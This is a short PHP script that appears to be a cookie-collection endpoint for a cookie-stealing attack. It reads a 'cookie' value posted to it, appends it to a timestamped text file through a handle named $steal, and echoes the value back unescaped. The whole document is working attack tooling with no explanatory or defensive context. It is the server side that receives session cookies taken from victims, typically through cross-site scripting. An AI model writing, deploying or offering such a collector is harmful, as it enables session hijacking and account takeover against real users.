<?php

$cookie = $_POST["cookie"];
$time = time();
$filename = "cookie" . $time . ".txt";
$steal = fopen($filename, "a");
fwrite($steal, $cookie ."\\n");
fclose($steal);
echo $cookie;